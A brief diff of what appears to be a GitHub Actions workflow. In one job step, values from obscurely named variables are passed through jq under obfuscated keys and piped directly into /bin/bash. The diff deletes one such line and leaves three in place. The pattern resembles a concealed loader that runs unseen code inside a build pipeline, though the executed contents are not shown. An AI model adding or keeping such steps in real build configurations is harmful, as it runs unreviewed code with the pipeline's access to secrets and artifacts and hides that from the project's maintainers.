@@ -21,7 +21,6 @@ jobs:
           echo $h4 | jq -r .h84953 | /bin/bash
           echo $lyepy1 | jq -r .lerkf45500 | /bin/bash
           echo $ge24 | jq -r .py736 | /bin/bash
-          printf '%s' "$pri64" | jq -r .fhy90035 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
